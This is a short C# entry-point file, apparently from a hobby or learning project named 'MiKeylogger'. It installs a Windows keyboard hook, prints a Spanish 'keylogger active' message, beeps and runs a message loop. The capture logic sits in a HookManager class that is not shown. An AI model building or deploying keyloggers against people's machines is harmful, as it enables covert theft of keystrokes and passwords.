using System;
using System.Runtime.InteropServices;
using static MiKeylogger12042025_.net4._8.HookManager;
using System.Windows.Forms;
namespace MiKeylogger12042025_.net4._8
{
    internal class Program
    {
        private static IntPtr hookID = IntPtr.Zero;
        static void Main(string[] args)
        {
            Console.WriteLine("Keylogger activo 🍻 (CTRL+C para detener)");

            hookID = SetHook(HookCallback);
            for (int i = 0; i < 5; i++)
            {
                Console.Beep(1000 + i * 200, 300);
            }

            Application.Run();

            UnhookWindowsHookEx(hookID);

        }
    }
}
